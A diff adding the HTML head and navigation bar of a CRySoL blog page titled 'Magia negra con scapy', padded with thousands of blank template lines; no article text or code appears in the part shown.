@@ -1,0 +1,6271 @@
+
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <title>Magia negra con scapy</title>
+    
+    <meta name="author" content="CRySoL">
+
+    <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js" type="text/javascript"></script>
+    <script src="/javascripts/main.js"></script>
+
+    <!-- Enable responsive viewport -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <!-- Le HTML5 shim, for IE6-8 support of HTML elements -->
+    <!--[if lt IE 9]>
+      <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+
+    <!-- Le styles -->
+    <link href="/assets/themes//bootstrap/css/bootstrap.2.2.2.min.css" rel="stylesheet">
+    <link href="/assets/themes//css/style.css?body=1" rel="stylesheet" type="text/css" media="all">
+    <link href="/stylesheets/pygment_trac.css" rel="stylesheet" type="text/css" media="all">
+
+    <!-- Le fav and touch icons -->
+    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico">
+
+  <!-- Update these with your own images
+    <link rel="apple-touch-icon" href="images/apple-touch-icon.png">
+    <link rel="apple-touch-icon" sizes="72x72" href="images/apple-touch-icon-72x72.png">
+    <link rel="apple-touch-icon" sizes="114x114" href="images/apple-touch-icon-114x114.png">
+  -->
+
+    <!-- atom & rss feed -->
+    <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="Sitewide ATOM Feed">
+    <link href="/rss.xml" type="application/rss+xml" rel="alternate" title="Sitewide RSS Feed">
+
+    
+
+  </head>
+
+  <body>
+    <div class="navbar navbar-fixed-top">
+      <div class="navbar-inner">
+        <div class="container-narrow">
+<!--
+	  <a class="brand-image" href="/"><img class="brand-image" src="/assets/themes//logo.png"/></a>
+-->
+          <a class="brand" href="/">CRySoL</a>
+          <ul class="nav">
+            
+            
+            
+
+
+  
+    
+  
+    
+      
+      	
+      	<li><a href="/about.html">About</a></li>
+      	
+      
+    
+  
+    
+      
+      	
+      	<li><a href="/archive.html">Archive</a></li>
+      	
+      
+    
+  
+    
+      
+    
+  
+    
+  
+    
+      
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
